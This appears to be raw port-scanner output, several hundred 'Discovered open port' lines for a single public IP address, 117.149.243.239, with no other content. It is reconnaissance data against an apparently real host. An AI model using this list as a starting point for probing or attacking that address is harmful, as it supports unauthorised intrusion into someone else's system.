Discovered open port 2800/tcp on 117.149.243.239
Discovered open port 100/tcp on 117.149.243.239
Discovered open port 1164/tcp on 117.149.243.239
Discovered open port 902/tcp on 117.149.243.239
Discovered open port 55056/tcp on 117.149.243.239
Discovered open port 3551/tcp on 117.149.243.239
Discovered open port 34573/tcp on 117.149.243.239
Discovered open port 9999/tcp on 117.149.243.239
Discovered open port 10001/tcp on 117.149.243.239
Discovered open port 1863/tcp on 117.149.243.239
Discovered open port 56738/tcp on 117.149.243.239
Discovered open port 636/tcp on 117.149.243.239
Discovered open port 9575/tcp on 117.149.243.239
Discovered open port 12000/tcp on 117.149.243.239
Discovered open port 987/tcp on 117.149.243.239
Discovered open port 9110/tcp on 117.149.243.239
Discovered open port 9878/tcp on 117.149.243.239
Discovered open port 6565/tcp on 117.149.243.239
Discovered open port 88/tcp on 117.149.243.239
Discovered open port 7000/tcp on 117.149.243.239
Discovered open port 8300/tcp on 117.149.243.239
Discovered open port 2260/tcp on 117.149.243.239
Discovered open port 61900/tcp on 117.149.243.239
Discovered open port 1805/tcp on 117.149.243.239
Discovered open port 4446/tcp on 117.149.243.239
Discovered open port 1132/tcp on 117.149.243.239
Discovered open port 1102/tcp on 117.149.243.239
Discovered open port 212/tcp on 117.149.243.239
Discovered open port 3827/tcp on 117.149.243.239
Discovered open port 5859/tcp on 117.149.243.239
Discovered open port 5903/tcp on 117.149.243.239
Discovered open port 990/tcp on 117.149.243.239
Discovered open port 1455/tcp on 117.149.243.239
Discovered open port 8022/tcp on 117.149.243.239
Discovered open port 15004/tcp on 117.149.243.239
Discovered open port 1801/tcp on 117.149.243.239
Discovered open port 1183/tcp on 117.149.243.239
Discovered open port 280/tcp on 117.149.243.239
Discovered open port 444/tcp on 117.149.243.239
Discovered open port 1066/tcp on 117.149.243.239
Discovered open port 3013/tcp on 117.149.243.239
Discovered open port 34571/tcp on 117.149.243.239
Discovered open port 5988/tcp on 117.149.243.239
Discovered open port 1718/tcp on 117.149.243.239
Discovered open port 1812/tcp on 117.149.243.239
Discovered open port 6003/tcp on 117.149.243.239
Discovered open port 3766/tcp on 117.149.243.239
Discovered open port 3268/tcp on 117.149.243.239
Discovered open port 1026/tcp on 117.149.243.239
Discovered open port 5922/tcp on 117.149.243.239
Discovered open port 32783/tcp on 117.149.243.239
Discovered open port 7/tcp on 117.149.243.239
Discovered open port 19/tcp on 117.149.243.239
Discovered open port 2200/tcp on 117.149.243.239
Discovered open port 1840/tcp on 117.149.243.239
Discovered open port 9009/tcp on 117.149.243.239
Discovered open port 8084/tcp on 117.149.243.239
Discovered open port 44176/tcp on 117.149.243.239
Discovered open port 5815/tcp on 117.149.243.239
Discovered open port 555/tcp on 117.149.243.239
Discovered open port 5987/tcp on 117.149.243.239
Discovered open port 5004/tcp on 117.149.243.239
Discovered open port 10616/tcp on 117.149.243.239
Discovered open port 125/tcp on 117.149.243.239
Discovered open port 513/tcp on 117.149.243.239
Discovered open port 1998/tcp on 117.149.243.239
Discovered open port 1272/tcp on 117.149.243.239
Discovered open port 6156/tcp on 117.149.243.239
Discovered open port 49160/tcp on 117.149.243.239
Discovered open port 3367/tcp on 117.149.243.239
Discovered open port 7002/tcp on 117.149.243.239
Discovered open port 4125/tcp on 117.149.243.239
Discovered open port 1175/tcp on 117.149.243.239
Discovered open port 7777/tcp on 117.149.243.239
Discovered open port 49153/tcp on 117.149.243.239
Discovered open port 6112/tcp on 117.149.243.239
Discovered open port 10002/tcp on 117.149.243.239
Discovered open port 6006/tcp on 117.149.243.239
Discovered open port 61532/tcp on 117.149.243.239
Discovered open port 7741/tcp on 117.149.243.239
Discovered open port 4045/tcp on 117.149.243.239
Discovered open port 3784/tcp on 117.149.243.239
Discovered open port 163/tcp on 117.149.243.239
Discovered open port 8082/tcp on 117.149.243.239
Discovered open port 5225/tcp on 117.149.243.239
Discovered open port 5001/tcp on 117.149.243.239
Discovered open port 7676/tcp on 117.149.243.239
Discovered open port 7070/tcp on 117.149.243.239
Discovered open port 992/tcp on 117.149.243.239
Discovered open port 3351/tcp on 117.149.243.239
Discovered open port 1038/tcp on 117.149.243.239
Discovered open port 720/tcp on 117.149.243.239
Discovered open port 2251/tcp on 117.149.243.239
Discovered open port 888/tcp on 117.149.243.239
Discovered open port 1049/tcp on 117.149.243.239
Discovered open port 5862/tcp on 117.149.243.239
Discovered open port 6567/tcp on 117.149.243.239
Discovered open port 27715/tcp on 117.149.243.239
Discovered open port 7800/tcp on 117.149.243.239
Discovered open port 2021/tcp on 117.149.243.239
Discovered open port 12265/tcp on 117.149.243.239
Discovered open port 7999/tcp on 117.149.243.239
Discovered open port 1688/tcp on 117.149.243.239
Discovered open port 9/tcp on 117.149.243.239
Discovered open port 2161/tcp on 117.149.243.239
Discovered open port 16080/tcp on 117.149.243.239
Discovered open port 2068/tcp on 117.149.243.239
Discovered open port 1040/tcp on 117.149.243.239
Discovered open port 8000/tcp on 117.149.243.239
Discovered open port 7938/tcp on 117.149.243.239
Discovered open port 6002/tcp on 117.149.243.239
Discovered open port 2105/tcp on 117.149.243.239
Discovered open port 5226/tcp on 117.149.243.239
Discovered open port 8007/tcp on 117.149.243.239
Discovered open port 33354/tcp on 117.149.243.239
Discovered open port 541/tcp on 117.149.243.239
Discovered open port 8031/tcp on 117.149.243.239
Discovered open port 85/tcp on 117.149.243.239
Discovered open port 1113/tcp on 117.149.243.239
Discovered open port 19842/tcp on 117.149.243.239
Discovered open port 1041/tcp on 117.149.243.239
Discovered open port 1165/tcp on 117.149.243.239
Discovered open port 31038/tcp on 117.149.243.239
Discovered open port 10778/tcp on 117.149.243.239
Discovered open port 9091/tcp on 117.149.243.239
Discovered open port 1186/tcp on 117.149.243.239
Discovered open port 14442/tcp on 117.149.243.239
Discovered open port 2998/tcp on 117.149.243.239
Discovered open port 3260/tcp on 117.149.243.239
Discovered open port 43/tcp on 117.149.243.239
Discovered open port 1247/tcp on 117.149.243.239
Discovered open port 1187/tcp on 117.149.243.239
Discovered open port 3995/tcp on 117.149.243.239
Discovered open port 1198/tcp on 117.149.243.239
Discovered open port 14441/tcp on 117.149.243.239
Discovered open port 1935/tcp on 117.149.243.239
Discovered open port 32779/tcp on 117.149.243.239
Discovered open port 1119/tcp on 117.149.243.239
Discovered open port 5998/tcp on 117.149.243.239
Discovered open port 1839/tcp on 117.149.243.239
Discovered open port 5100/tcp on 117.149.243.239
Discovered open port 8194/tcp on 117.149.243.239
Discovered open port 6004/tcp on 117.149.243.239
Discovered open port 1322/tcp on 117.149.243.239
Discovered open port 2393/tcp on 117.149.243.239
Discovered open port 3889/tcp on 117.149.243.239
Discovered open port 1064/tcp on 117.149.243.239
Discovered open port 15002/tcp on 117.149.243.239
Discovered open port 2135/tcp on 117.149.243.239
Discovered open port 2869/tcp on 117.149.243.239
Discovered open port 458/tcp on 117.149.243.239
Discovered open port 3011/tcp on 117.149.243.239
Discovered open port 7402/tcp on 117.149.243.239
Discovered open port 543/tcp on 117.149.243.239
Discovered open port 5566/tcp on 117.149.243.239
Discovered open port 1494/tcp on 117.149.243.239
Discovered open port 79/tcp on 117.149.243.239
Discovered open port 6106/tcp on 117.149.243.239
Discovered open port 4321/tcp on 117.149.243.239
Discovered open port 5950/tcp on 117.149.243.239
Discovered open port 1086/tcp on 117.149.243.239
Discovered open port 49/tcp on 117.149.243.239
Discovered open port 259/tcp on 117.149.243.239
Discovered open port 1091/tcp on 117.149.243.239
Discovered open port 50000/tcp on 117.149.243.239
Discovered open port 2607/tcp on 117.149.243.239
Discovered open port 6788/tcp on 117.149.243.239
Discovered open port 20221/tcp on 117.149.243.239
Discovered open port 9595/tcp on 117.149.243.239
Discovered open port 1583/tcp on 117.149.243.239
Discovered open port 9099/tcp on 117.149.243.239
Discovered open port 7435/tcp on 117.149.243.239
Discovered open port 4848/tcp on 117.149.243.239
Discovered open port 1043/tcp on 117.149.243.239
Discovered open port 340/tcp on 117.149.243.239
Discovered open port 1002/tcp on 117.149.243.239
Discovered open port 2040/tcp on 117.149.243.239
Discovered open port 1521/tcp on 117.149.243.239
Discovered open port 2100/tcp on 117.149.243.239
Discovered open port 8100/tcp on 117.149.243.239
Discovered open port 481/tcp on 117.149.243.239
Discovered open port 8093/tcp on 117.149.243.239
Discovered open port 7200/tcp on 117.149.243.239
Discovered open port 26/tcp on 117.149.243.239
Discovered open port 306/tcp on 117.149.243.239
Discovered open port 1580/tcp on 117.149.243.239
Discovered open port 687/tcp on 117.149.243.239
Discovered open port 2191/tcp on 117.149.243.239
Discovered open port 30000/tcp on 117.149.243.239
Discovered open port 1862/tcp on 117.149.243.239
Discovered open port 49163/tcp on 117.149.243.239
Discovered open port 500/tcp on 117.149.243.239
Discovered open port 5221/tcp on 117.149.243.239
Discovered open port 1036/tcp on 117.149.243.239
Discovered open port 3007/tcp on 117.149.243.239
Discovered open port 5051/tcp on 117.149.243.239
Discovered open port 5500/tcp on 117.149.243.239
Discovered open port 1145/tcp on 117.149.243.239
Discovered open port 28201/tcp on 117.149.243.239
Discovered open port 3920/tcp on 117.149.243.239
Discovered open port 19801/tcp on 117.149.243.239
Discovered open port 51493/tcp on 117.149.243.239
Discovered open port 5000/tcp on 117.149.243.239
Discovered open port 1059/tcp on 117.149.243.239
Discovered open port 3737/tcp on 117.149.243.239
Discovered open port 7921/tcp on 117.149.243.239
Discovered open port 631/tcp on 117.149.243.239
Discovered open port 49167/tcp on 117.149.243.239
Discovered open port 4224/tcp on 117.149.243.239
Discovered open port 24444/tcp on 117.149.243.239
Discovered open port 783/tcp on 117.149.243.239
Discovered open port 1010/tcp on 117.149.243.239
Discovered open port 32782/tcp on 117.149.243.239
Discovered open port 9111/tcp on 117.149.243.239
Discovered open port 4000/tcp on 117.149.243.239
Discovered open port 4443/tcp on 117.149.243.239
Discovered open port 50300/tcp on 117.149.243.239
Discovered open port 1022/tcp on 117.149.243.239
Discovered open port 99/tcp on 117.149.243.239
Discovered open port 1461/tcp on 117.149.243.239
Discovered open port 9666/tcp on 117.149.243.239
Discovered open port 52822/tcp on 117.149.243.239
Discovered open port 57797/tcp on 117.149.243.239
Discovered open port 12345/tcp on 117.149.243.239
Discovered open port 7496/tcp on 117.149.243.239
Discovered open port 9535/tcp on 117.149.243.239
Discovered open port 32/tcp on 117.149.243.239
Discovered open port 3333/tcp on 117.149.243.239
Discovered open port 3269/tcp on 117.149.243.239
Discovered open port 1095/tcp on 117.149.243.239
Discovered open port 5915/tcp on 117.149.243.239
Discovered open port 1755/tcp on 117.149.243.239
Discovered open port 52673/tcp on 117.149.243.239
Discovered open port 49154/tcp on 117.149.243.239
Discovered open port 9418/tcp on 117.149.243.239
Discovered open port 49176/tcp on 117.149.243.239
Discovered open port 5080/tcp on 117.149.243.239
Discovered open port 119/tcp on 117.149.243.239
Discovered open port 49158/tcp on 117.149.243.239
Discovered open port 26214/tcp on 117.149.243.239
Discovered open port 1417/tcp on 117.149.243.239
Discovered open port 45100/tcp on 117.149.243.239
Discovered open port 3168/tcp on 117.149.243.239
Discovered open port 7911/tcp on 117.149.243.239
Discovered open port 406/tcp on 117.149.243.239
Discovered open port 2190/tcp on 117.149.243.239
Discovered open port 1719/tcp on 117.149.243.239
Discovered open port 9500/tcp on 117.149.243.239
Discovered open port 880/tcp on 117.149.243.239
Discovered open port 65389/tcp on 117.149.243.239
Discovered open port 32778/tcp on 117.149.243.239
Discovered open port 3826/tcp on 117.149.243.239
Discovered open port 25735/tcp on 117.149.243.239
Discovered open port 3030/tcp on 117.149.243.239
Discovered open port 4900/tcp on 117.149.243.239
Discovered open port 2103/tcp on 117.149.243.239
Discovered open port 32775/tcp on 117.149.243.239
Discovered open port 5432/tcp on 117.149.243.239
Discovered open port 4/tcp on 117.149.243.239
Discovered open port 544/tcp on 117.149.243.239
Discovered open port 83/tcp on 117.149.243.239
Discovered open port 2065/tcp on 117.149.243.239
Discovered open port 16012/tcp on 117.149.243.239
Discovered open port 10180/tcp on 117.149.243.239
Discovered open port 4004/tcp on 117.149.243.239
Discovered open port 20/tcp on 117.149.243.239
Discovered open port 3211/tcp on 117.149.243.239
Discovered open port 65129/tcp on 117.149.243.239
Discovered open port 1296/tcp on 117.149.243.239
Discovered open port 56737/tcp on 117.149.243.239
Discovered open port 3801/tcp on 117.149.243.239
Discovered open port 55600/tcp on 117.149.243.239
Discovered open port 1080/tcp on 117.149.243.239
Discovered open port 3003/tcp on 117.149.243.239
Discovered open port 787/tcp on 117.149.243.239
Discovered open port 1087/tcp on 117.149.243.239
Discovered open port 90/tcp on 117.149.243.239
Discovered open port 1783/tcp on 117.149.243.239
Discovered open port 4279/tcp on 117.149.243.239
Discovered open port 1045/tcp on 117.149.243.239
Discovered open port 14238/tcp on 117.149.243.239
Discovered open port 8002/tcp on 117.149.243.239
Discovered open port 1056/tcp on 117.149.243.239
Discovered open port 2179/tcp on 117.149.243.239
Discovered open port 1075/tcp on 117.149.243.239
Discovered open port 1088/tcp on 117.149.243.239
Discovered open port 16993/tcp on 117.149.243.239
Discovered open port 2030/tcp on 117.149.243.239
Discovered open port 48080/tcp on 117.149.243.239
Discovered open port 3546/tcp on 117.149.243.239
Discovered open port 2005/tcp on 117.149.243.239
Discovered open port 7625/tcp on 117.149.243.239
Discovered open port 8402/tcp on 117.149.243.239
Discovered open port 366/tcp on 117.149.243.239
Discovered open port 2043/tcp on 117.149.243.239
Discovered open port 20031/tcp on 117.149.243.239
Discovered open port 3690/tcp on 117.149.243.239
Discovered open port 1001/tcp on 117.149.243.239
Discovered open port 8090/tcp on 117.149.243.239
Discovered open port 109/tcp on 117.149.243.239
Discovered open port 705/tcp on 117.149.243.239
Discovered open port 5631/tcp on 117.149.243.239
Discovered open port 1666/tcp on 117.149.243.239
Discovered open port 32784/tcp on 117.149.243.239
Discovered open port 1062/tcp on 117.149.243.239
Discovered open port 9503/tcp on 117.149.243.239
Discovered open port 9593/tcp on 117.149.243.239
Discovered open port 3493/tcp on 117.149.243.239
Discovered open port 1641/tcp on 117.149.243.239
Discovered open port 17/tcp on 117.149.243.239
Discovered open port 2045/tcp on 117.149.243.239
Discovered open port 1658/tcp on 117.149.243.239
Discovered open port 5959/tcp on 117.149.243.239
Discovered open port 10012/tcp on 117.149.243.239
Discovered open port 1217/tcp on 117.149.243.239
Discovered open port 54328/tcp on 117.149.243.239
Discovered open port 1063/tcp on 117.149.243.239
Discovered open port 6510/tcp on 117.149.243.239
Discovered open port 10000/tcp on 117.149.243.239
Discovered open port 6692/tcp on 117.149.243.239
Discovered open port 5544/tcp on 117.149.243.239
Discovered open port 16113/tcp on 117.149.243.239
Discovered open port 13/tcp on 117.149.243.239
Discovered open port 1061/tcp on 117.149.243.239
Discovered open port 2196/tcp on 117.149.243.239
Discovered open port 8701/tcp on 117.149.243.239
Discovered open port 8222/tcp on 117.149.243.239
Discovered open port 691/tcp on 117.149.243.239
Discovered open port 3914/tcp on 117.149.243.239
Discovered open port 898/tcp on 117.149.243.239
Discovered open port 8001/tcp on 117.149.243.239
Discovered open port 44443/tcp on 117.149.243.239
Discovered open port 563/tcp on 117.149.243.239
Discovered open port 10003/tcp on 117.149.243.239
Discovered open port 10082/tcp on 117.149.243.239
Discovered open port 1216/tcp on 117.149.243.239
Discovered open port 30/tcp on 117.149.243.239
Discovered open port 8333/tcp on 117.149.243.239
Discovered open port 3814/tcp on 117.149.243.239
Discovered open port 1048/tcp on 117.149.243.239
Discovered open port 10004/tcp on 117.149.243.239
Discovered open port 20222/tcp on 117.149.243.239
Discovered open port 2605/tcp on 117.149.243.239
Discovered open port 2323/tcp on 117.149.243.239
Discovered open port 7627/tcp on 117.149.243.239
Discovered open port 17877/tcp on 117.149.243.239
Discovered open port 6580/tcp on 117.149.243.239
Discovered open port 31337/tcp on 117.149.243.239
Discovered open port 1137/tcp on 117.149.243.239
Discovered open port 646/tcp on 117.149.243.239
Discovered open port 89/tcp on 117.149.243.239
Discovered open port 873/tcp on 117.149.243.239
Discovered open port 44501/tcp on 117.149.243.239
Discovered open port 49159/tcp on 117.149.243.239
Discovered open port 3580/tcp on 117.149.243.239
Discovered open port 9050/tcp on 117.149.243.239
Discovered open port 2608/tcp on 117.149.243.239
Discovered open port 524/tcp on 117.149.243.239
Discovered open port 5560/tcp on 117.149.243.239
Discovered open port 1042/tcp on 117.149.243.239
Discovered open port 7106/tcp on 117.149.243.239
Discovered open port 6566/tcp on 117.149.243.239
Discovered open port 1077/tcp on 117.149.243.239
Discovered open port 81/tcp on 117.149.243.239
Discovered open port 1011/tcp on 117.149.243.239
Discovered open port 2701/tcp on 117.149.243.239
Discovered open port 8042/tcp on 117.149.243.239
Discovered open port 1057/tcp on 117.149.243.239
Discovered open port 3071/tcp on 117.149.243.239
Discovered open port 6101/tcp on 117.149.243.239
Discovered open port 648/tcp on 117.149.243.239
Discovered open port 2022/tcp on 117.149.243.239
Discovered open port 7019/tcp on 117.149.243.239
Discovered open port 161/tcp on 117.149.243.239
Discovered open port 1151/tcp on 117.149.243.239
Discovered open port 106/tcp on 117.149.243.239
Discovered open port 2401/tcp on 117.149.243.239
Discovered open port 8254/tcp on 117.149.243.239
Discovered open port 683/tcp on 117.149.243.239
Discovered open port 2033/tcp on 117.149.243.239
Discovered open port 3322/tcp on 117.149.243.239
Discovered open port 264/tcp on 117.149.243.239
Discovered open port 1782/tcp on 117.149.243.239
Discovered open port 5280/tcp on 117.149.243.239
Discovered open port 32772/tcp on 117.149.243.239
Discovered open port 8800/tcp on 117.149.243.239
Discovered open port 6346/tcp on 117.149.243.239
Discovered open port 179/tcp on 117.149.243.239
Discovered open port 1035/tcp on 117.149.243.239
Discovered open port 8010/tcp on 117.149.243.239
Discovered open port 2399/tcp on 117.149.243.239
Discovered open port 2381/tcp on 117.149.243.239
Discovered open port 2049/tcp on 117.149.243.239
Discovered open port 21571/tcp on 117.149.243.239
Discovered open port 6839/tcp on 117.149.243.239
Discovered open port 3283/tcp on 117.149.243.239
Discovered open port 1079/tcp on 117.149.243.239
Discovered open port 50800/tcp on 117.149.243.239
Discovered open port 1121/tcp on 117.149.243.239
Discovered open port 1984/tcp on 117.149.243.239
Discovered open port 1500/tcp on 117.149.243.239
Discovered open port 1328/tcp on 117.149.243.239
Discovered open port 2001/tcp on 117.149.243.239
Discovered open port 211/tcp on 117.149.243.239
Discovered open port 1032/tcp on 117.149.243.239
Discovered open port 15660/tcp on 117.149.243.239
Discovered open port 9415/tcp on 117.149.243.239
Discovered open port 6666/tcp on 117.149.243.239
Discovered open port 20000/tcp on 117.149.243.239
Discovered open port 34572/tcp on 117.149.243.239
Discovered open port 8290/tcp on 117.149.243.239
Discovered open port 16992/tcp on 117.149.243.239
Discovered open port 41511/tcp on 117.149.243.239
Discovered open port 2048/tcp on 117.149.243.239
Discovered open port 8652/tcp on 117.149.243.239
Discovered open port 1914/tcp on 117.149.243.239
Discovered open port 52848/tcp on 117.149.243.239
Discovered open port 22939/tcp on 117.149.243.239
Discovered open port 425/tcp on 117.149.243.239
Discovered open port 6389/tcp on 117.149.243.239
Discovered open port 497/tcp on 117.149.243.239
Discovered open port 1533/tcp on 117.149.243.239
Discovered open port 10626/tcp on 117.149.243.239
Discovered open port 1094/tcp on 117.149.243.239
Discovered open port 1111/tcp on 117.149.243.239
Discovered open port 10617/tcp on 117.149.243.239
Discovered open port 49156/tcp on 117.149.243.239
Discovered open port 625/tcp on 117.149.243.239
Discovered open port 5801/tcp on 117.149.243.239
Discovered open port 82/tcp on 117.149.243.239
Discovered open port 5009/tcp on 117.149.243.239
Discovered open port 1126/tcp on 117.149.243.239
Discovered open port 10628/tcp on 117.149.243.239
Discovered open port 27355/tcp on 117.149.243.239
Discovered open port 1065/tcp on 117.149.243.239
Discovered open port 1277/tcp on 117.149.243.239
Discovered open port 8087/tcp on 117.149.243.239
Discovered open port 465/tcp on 117.149.243.239
Discovered open port 1233/tcp on 117.149.243.239
Discovered open port 4998/tcp on 117.149.243.239
Discovered open port 9998/tcp on 117.149.243.239
Discovered open port 3369/tcp on 117.149.243.239
Discovered open port 3800/tcp on 117.149.243.239
Discovered open port 2604/tcp on 117.149.243.239
Discovered open port 5087/tcp on 117.149.243.239
Discovered open port 1058/tcp on 117.149.243.239
Discovered open port 5811/tcp on 117.149.243.239
Discovered open port 13722/tcp on 117.149.243.239
Discovered open port 2006/tcp on 117.149.243.239
Discovered open port 2909/tcp on 117.149.243.239
Discovered open port 2718/tcp on 117.149.243.239
Discovered open port 8083/tcp on 117.149.243.239
Discovered open port 1700/tcp on 117.149.243.239
Discovered open port 8651/tcp on 117.149.243.239
Discovered open port 27000/tcp on 117.149.243.239
Discovered open port 2046/tcp on 117.149.243.239
Discovered open port 1141/tcp on 117.149.243.239
Discovered open port 1007/tcp on 117.149.243.239
Discovered open port 1309/tcp on 117.149.243.239
Discovered open port 2107/tcp on 117.149.243.239
Discovered open port 1213/tcp on 117.149.243.239
Discovered open port 5510/tcp on 117.149.243.239
Discovered open port 9876/tcp on 117.149.243.239
Discovered open port 2170/tcp on 117.149.243.239
Discovered open port 6789/tcp on 117.149.243.239
Discovered open port 254/tcp on 117.149.243.239
Discovered open port 5102/tcp on 117.149.243.239
Discovered open port 8443/tcp on 117.149.243.239
Discovered open port 8400/tcp on 117.149.243.239
Discovered open port 11110/tcp on 117.149.243.239
Discovered open port 726/tcp on 117.149.243.239
Discovered open port 255/tcp on 117.149.243.239
Discovered open port 50003/tcp on 117.149.243.239
Discovered open port 616/tcp on 117.149.243.239
Discovered open port 2875/tcp on 117.149.243.239
Discovered open port 32780/tcp on 117.149.243.239
Discovered open port 2366/tcp on 117.149.243.239
Discovered open port 765/tcp on 117.149.243.239
Discovered open port 27352/tcp on 117.149.243.239
Discovered open port 5666/tcp on 117.149.243.239
Discovered open port 2525/tcp on 117.149.243.239
Discovered open port 18040/tcp on 117.149.243.239
Discovered open port 1071/tcp on 117.149.243.239
Discovered open port 60443/tcp on 117.149.243.239
Discovered open port 1166/tcp on 117.149.243.239
Discovered open port 20828/tcp on 117.149.243.239
Discovered open port 15742/tcp on 117.149.243.239
Discovered open port 1972/tcp on 117.149.243.239
Discovered open port 9103/tcp on 117.149.243.239
Discovered open port 44442/tcp on 117.149.243.239
Discovered open port 5200/tcp on 117.149.243.239
Discovered open port 3659/tcp on 117.149.243.239
Discovered open port 2968/tcp on 117.149.243.239
Discovered open port 3031/tcp on 117.149.243.239
Discovered open port 5298/tcp on 117.149.243.239
Discovered open port 8200/tcp on 117.149.243.239
Discovered open port 16018/tcp on 117.149.243.239
Discovered open port 1110/tcp on 117.149.243.239
Discovered open port 6689/tcp on 117.149.243.239
Discovered open port 2222/tcp on 117.149.243.239
Discovered open port 2717/tcp on 117.149.243.239
Discovered open port 4242/tcp on 117.149.243.239
Discovered open port 4002/tcp on 117.149.243.239
Discovered open port 1050/tcp on 117.149.243.239
Discovered open port 6547/tcp on 117.149.243.239
Discovered open port 9040/tcp on 117.149.243.239
Discovered open port 6000/tcp on 117.149.243.239
Discovered open port 9502/tcp on 117.149.243.239
Discovered open port 60020/tcp on 117.149.243.239
Discovered open port 2601/tcp on 117.149.243.239
Discovered open port 2522/tcp on 117.149.243.239
Discovered open port 3986/tcp on 117.149.243.239
Discovered open port 9898/tcp on 117.149.243.239
Discovered open port 5003/tcp on 117.149.243.239
Discovered open port 58080/tcp on 117.149.243.239
Discovered open port 1074/tcp on 117.149.243.239
Discovered open port 427/tcp on 117.149.243.239
Discovered open port 3703/tcp on 117.149.243.239
Discovered open port 3390/tcp on 117.149.243.239
Discovered open port 32768/tcp on 117.149.243.239
Discovered open port 7100/tcp on 117.149.243.239
Discovered open port 3809/tcp on 117.149.243.239
Discovered open port 1024/tcp on 117.149.243.239
Discovered open port 512/tcp on 117.149.243.239
Discovered open port 2809/tcp on 117.149.243.239
Discovered open port 1093/tcp on 117.149.243.239
Discovered open port 3/tcp on 117.149.243.239
Discovered open port 5030/tcp on 117.149.243.239
Discovered open port 8181/tcp on 117.149.243.239
Discovered open port 9003/tcp on 117.149.243.239
Discovered open port 301/tcp on 117.149.243.239
Discovered open port 1687/tcp on 117.149.243.239
Discovered open port 1169/tcp on 117.149.243.239
Discovered open port 13783/tcp on 117.149.243.239
Discovered open port 1117/tcp on 117.149.243.239
Discovered open port 1287/tcp on 117.149.243.239
Discovered open port 1090/tcp on 117.149.243.239
Discovered open port 1033/tcp on 117.149.243.239
Discovered open port 6699/tcp on 117.149.243.239
Discovered open port 7778/tcp on 117.149.243.239
Discovered open port 7443/tcp on 117.149.243.239
Discovered open port 1085/tcp on 117.149.243.239
Discovered open port 1301/tcp on 117.149.243.239
Discovered open port 2004/tcp on 117.149.243.239
Discovered open port 5002/tcp on 117.149.243.239
Discovered open port 49155/tcp on 117.149.243.239
Discovered open port 800/tcp on 117.149.243.239
Discovered open port 2041/tcp on 117.149.243.239
Discovered open port 2602/tcp on 117.149.243.239
Discovered open port 6668/tcp on 117.149.243.239
Discovered open port 8600/tcp on 117.149.243.239
Discovered open port 5989/tcp on 117.149.243.239
Discovered open port 10621/tcp on 117.149.243.239
Discovered open port 32773/tcp on 117.149.243.239
Discovered open port 2160/tcp on 117.149.243.239
Discovered open port 84/tcp on 117.149.243.239
Discovered open port 6502/tcp on 117.149.243.239
Discovered open port 57294/tcp on 117.149.243.239
Discovered open port 7920/tcp on 117.149.243.239
Discovered open port 2008/tcp on 117.149.243.239